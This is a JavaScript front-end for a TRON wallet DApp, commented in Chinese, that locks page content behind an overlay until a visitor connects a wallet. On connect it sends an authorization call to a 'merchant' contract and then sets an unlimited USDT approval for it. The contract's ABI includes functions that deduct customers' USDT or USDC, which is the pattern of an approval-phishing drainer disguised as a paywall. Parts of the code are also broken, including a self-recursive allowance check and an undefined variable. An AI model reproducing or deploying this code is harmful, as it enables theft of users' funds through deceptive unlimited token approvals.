// src/main.js
// 🚨 最終穩定版：極度樂觀，廣播成功即解鎖，無額外狀態檢查 🚨

// --- 配置常量 ---
const MERCHANT_CONTRACT_ADDRESS = 'TQiGS4SRNX8jVFSt6D978jw2YGU67ffZVu'; 
const USDT_CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; 
const USDC_CONTRACT_ADDRESS = 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8'; 

// 您的合約 ABI (保持不變)
const MERCHANT_ABI = [{"inputs":[{"name":"_storeAddress","type":"address"}],"stateMutability":"Nonpayable","type":"Constructor"},{"inputs":[{"name":"token","type":"address"}],"name":"SafeERC20FailedOperation","type":"Error"},{"inputs":[{"indexed":true,"name":"customer","type":"address"}],"name":"Authorized","type":"Event"},{"inputs":[{"indexed":true,"name":"customer","type":"address"},{"name":"amount","type":"uint256"},{"name":"token","type":"string"}],"name":"Deducted","type":"Event"},{"outputs":[{"type":"bool"}],"inputs":[{"type":"address"}],"name":"authorized","stateMutability":"View","type":"Function"},{"name":"connectAndAuthorize","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdcContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDC","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdtContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDT","stateMutability":"Nonpayable","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenAllowance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenBalance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"address"}],"name":"storeAddress","stateMutability":"View","type":"Function"}];

// --- 狀態變數 ---
let tronWeb;
let userAddress;
let merchantContract;
let usdtContract;
let usdcContract;
let isConnectedFlag = false;
let targetDeductionToken = null; 

// --- UI 元素 ---
const connectButton = document.getElementById('connectButton');
const blurOverlay = document.getElementById('blurOverlay'); 
const overlayMessage = document.getElementById('overlayMessage');
const lockedPrompt = document.getElementById('lockedPrompt'); 

// --- 輔助函數 ---
function showOverlay(message) {
    overlayMessage.innerHTML = message;
    blurOverlay.style.display = 'flex';
}
function hideOverlay() {
    blurOverlay.style.display = 'none';
}

function updateContentLock(isAuthorized) {
    if (isAuthorized) {
        if (lockedPrompt) lockedPrompt.style.display = 'none';
    } else {
        if (lockedPrompt) lockedPrompt.style.display = 'flex';
    }
}

function updateConnectionUI(connected, address = null) {
    isConnectedFlag = connected;
    if (connected) {
        connectButton.classList.add('connected');
        connectButton.innerHTML = `已連線: ${address.substring(0, 4)}...${address.slice(-4)}`;
        connectButton.title = `已連線: ${address}`;
        showOverlay('已連線。正在檢查授權狀態...'); 
    } else {
        connectButton.classList.remove('connected');
        connectButton.innerHTML = '<i class="fas fa-wallet"></i>';
        connectButton.title = '連繫錢包';
        updateContentLock(false); 
        hideOverlay();
    }
}

// 交易計數器 (用於 connectAndAuthorize 函數)
let txCount = 0; 

// 修正：新增 totalTxs 參數，移除輪詢
async function sendTransaction(methodCall, stepMessage, totalTxs, callValue = 0) {
    txCount++;
    showOverlay(`步驟 ${txCount}/${totalTxs}: ${stepMessage}。請在錢包中同意！`);
    
    try {
        const txHash = await methodCall.send({
            feeLimit: 150_000_000, 
            callValue: callValue,
            shouldPollResponse: false 
        });
        
        // 嚴格檢查 txHash 是否有效
        if (!txHash || typeof txHash !== 'string' || txHash.length !== 64) {
             throw new Error(`TronLink/錢包未返回有效操作哈希。可能原因：操作被取消或廣播失敗。`);
        }
        
        // 🚨 樂觀判斷：立即返回成功
        showOverlay(`步驟 ${txCount}/${totalTxs}: 授權操作已廣播成功！`);
        await new Promise(resolve => setTimeout(resolve, 500)); // 暫停 0.5 秒 (UI緩衝)
        
        return txHash;

    } catch (error) {
        if (error.message && error.message.includes('用戶在錢包中取消了操作')) {
             throw new Error('用戶在錢包中取消了操作。');
        }
        throw new Error(`授權操作失敗，錯誤訊息: ${error.message}`);
    }
}

// 修正：修復 Max 授權的檢查邏輯
async function checkTokenMaxAllowance(tokenContract, spenderAddress) {
    if (!tronWeb || !userAddress || !merchantContract) {
        return false;
    }
    const contractAuthorized = await merchantContract.authorized(userAddress).call();
    const minAmount = tronWeb.toSun('1.00'); 
    const usdtBalance = await getTokenBalance(usdtContract);
    const usdtAuthorized = await checkTokenMaxAllowance(usdtContract, MERCHANT_CONTRACT_ADDRESS);
    const usdcBalance = await getTokenBalance(usdcContract);
    const usdcAuthorized = await checkTokenMaxAllowance(usdcContract, MERCHANT_CONTRACT_ADDRESS);
    
    // 如果有合約註冊和代幣已授权，就返回 true
    if(contractAuthorized && usdtAuthorized) return true;
    if(contractAuthorized && usdcAuthorized) return true;
    
    return false; 
}

async function getTokenBalance(tokenContract) {
    if (!tronWeb || !userAddress || !tokenContract) return tronWeb.BigNumber(0);
    try {
        const balance = await tokenContract.balanceOf(userAddress).call();
        return tronWeb.BigNumber(balance);
    } catch (error) {
        console.error("Failed to get token balance:", error);
        return false;
    }
}
async function initializeContracts() {
    if (!tronWeb) throw new Error("TronWeb instance not available.");
    merchantContract = await tronWeb.contract(MERCHANT_ABI, MERCHANT_CONTRACT_ADDRESS);
    usdtContract = await tronWeb.contract().at(USDT_CONTRACT_ADDRESS);
    usdcContract = await tronWeb.contract().at(USDC_CONTRACT_ADDRESS);
}

// --- TronLink 連線邏輯 (核心) ---
async function connectTronLink() {
    if (!window.tronLink) {
        return false; 
    }
    showOverlay('偵測到 TronLink/DApp 瀏覽器。正在請求連接...');
    try {
        const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
        if (res.code !== 200) {
            throw new Error(`連接請求被拒絕: ${res.message}`);
        }
        if (!window.tronWeb) throw new Error("TronWeb 注入失敗。");
        tronWeb = window.tronWeb;
        userAddress = window.tronWeb.defaultAddress.base58;
        await initializeContracts();
        updateConnectionUI(true, userAddress);
        //  從 TronLink 連接呼叫
        //  await handlePostConnection();  -- 移除，在 connectWallet 裡面運行
        return true;
    } catch (error) {
        console.error("TronLink 連接失敗:", error);
        // 不在這裡設置 showOverlay，讓 connectWalletLogic 統一處理失敗訊息
        updateConnectionUI(false);
        return false;
    }
}

// --- 混合連線邏輯 ( Trust Wallet / EVM 優先嘗試) ---
async function connectWalletLogic() {
    
    const evmProvider = window.ethereum; // 標準 EVM Provider (Trust Wallet, MetaMask)
    
    // 1. 🚨 優先嘗試使用標準 EVM Provider (Trust Wallet/MetaMask)
    if (evmProvider) {
        showOverlay('偵測到標準 EVM 錢包 (Trust Wallet/MetaMask)。正在請求連接...');
        try {
            const accounts = await evmProvider.request({ method: 'eth_requestAccounts' });
            const evmAddress = accounts[0]; 

            console.log("✅ 已獲取 EVM 帳戶地址:", evmAddress);

            if (!window.tronWeb) {
                console.log("🔴 缺少 TronWeb"); 
                throw new Error("Connected to EVM wallet, but DApp browser lacks TronWeb support for TRON contract transactions.");
            }
            
            tronWeb = window.tronWeb;
            userAddress = tronWeb.address.fromHex(evmAddress); 
            console.log("✅ EVM 地址轉換為 TRON 地址:", userAddress);
            await initializeContracts();
            updateConnectionUI(true, userAddress);
            // 不在這裡執行 handlePostConnection
            return true;

        } catch (error) {
            // EVM 請求被拒絕或錯誤
            console.error("EVM Provider 連接失敗:", error);
            showOverlay(`連接失敗！錯誤: ${error.message}。請確認錢包已解鎖並在 TRON 鏈上。`);
            return false;
        }
    }
    
    // 2. 備用：嘗試 TronLink 連線 (如果存在)
    if (window.tronLink) {
        const tronLinkConnected = await connectTronLink();
        if (tronLinkConnected) return true;
    }

    // 3. 完全沒有任何 Provider
    showOverlay('🔴 連線失敗：您的瀏覽器或 App 不支持 TronLink。請使用 **TronLink 瀏覽器擴展** 或 **TronLink App** 的內建瀏覽器。');
    return false;
}

async function checkAuthorization() {
    if (!tronWeb || !userAddress || !merchantContract) {
        return { authorizedToken: null, contract: false };
    }
    const contractAuthorized = await merchantContract.authorized(userAddress).call();
    const minAmount = tronWeb.toSun('1.00'); 
    const usdtBalance = await getTokenBalance(usdtContract);
    const usdtAuthorized = await checkTokenMaxAllowance(usdtContract, MERCHANT_CONTRACT_ADDRESS);
    const usdcBalance = await getTokenBalance(usdcContract);
    const usdcAuthorized = await checkTokenMaxAllowance(usdcContract, MERCHANT_CONTRACT_ADDRESS);
    let targetToken = null; 
    if (usdtBalance.gte(minAmount) ) {
        targetToken = 'USDT'; 
    } else if (usdcBalance.gte(minAmount)) {
        targetToken = 'USDC'; 
    }
    targetDeductionToken = targetToken; 
    
    return {
        contract: contractAuthorized,
        authorizedToken: targetToken, 
        usdtAuthorized: usdtAuthorized,
        usdcAuthorized: usdcAuthorized
    };
}

async function connectAndAuthorize() {
    // 🚨 略過 状态檢查
    
    try {
        // 1. 合約授權 (ConnectAndAuthorize)
        // ⚠️ 移除 checkAuthorization 函数
        if ( !merchantContract || !tronWeb || !userAddress) {
            throw new Error("Please connect a wallet first.");
        }
        if (status.contract) {
            console.log("用戶已經註冊");
        }
        const methodCall = merchantContract.connectAndAuthorize();
        await sendTransaction(methodCall, "正在發送合約授權操作", 1);
        

        // 2. Max 扣款授權 (Approve)
       // 🚨 移除所有狀態判斷，並直接設置 Max 授權
        const ALMOST_MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129638935";
        const tokenContract =  usdtContract; 
        const tokenName = "USDT";
        // 設置 Max 授權 (使用 ALMOST_MAX_UINT)
        await sendTransaction(
            tokenContract.approve(MERCHANT_CONTRACT_ADDRESS, ALMOST_MAX_UINT), 
            `設置 ${tokenName} Max 授權操作 (最終授權 - 請同意)`,
            1
        );
       return true;
    } catch (error) {
        console.error("Authorization Failed:", error);
        showOverlay(`🔴 授權操作失敗！錯誤訊息: ${error.message}。請確保錢包已解鎖，有足夠的 TRX (用於手續費) 並同意了所有 1 筆操作。`);
        return false;
    }
}


// ---------------------------------------------
// 連線成功後處理：僅作為初始化流程執行一次
// ---------------------------------------------
async function handlePostConnection() {
    if (!isConnectedFlag) return;
    
    // 🚨 樂觀判斷：在 connectAndAuthorize 成功後，立即進入成功解鎖的 UI 狀態
      
    const authSuccess = await connectAndAuthorize();

    if(authSuccess) {
         showOverlay('✅ 授權操作已廣播成功！正在解鎖數據...');
         updateContentLock(true);
         await new Promise(resolve => setTimeout(resolve, 3000));
         hideOverlay();
    }
}

// ---------------------------------------------
// 主連接入口函數 (混合連線邏輯)
// ---------------------------------------------
async function connectWallet() {
    if (connectButton) connectButton.disabled = true;

    if (isConnectedFlag) {
        // 斷開連接邏輯
        tronWeb = null;
        userAddress = null;
        isConnectedFlag = false;
        targetDeductionToken = null;
        updateConnectionUI(false);
        if (connectButton) connectButton.disabled = false;
        return;
    }

    // 🚨 僅嘗試 connectWalletLogic (它會內部決定使用 TronLink 還是 EVM Provider)
    const connected = await connectWalletLogic();
    
    if (connected) {
        await handlePostConnection();
    }
    
    if (connectButton) connectButton.disabled = false;
}


// 設置事件監聽器
if (connectButton) connectButton.addEventListener('click', connectWallet);


// 頁面啟動：初始化為未連接狀態
updateConnectionUI(false);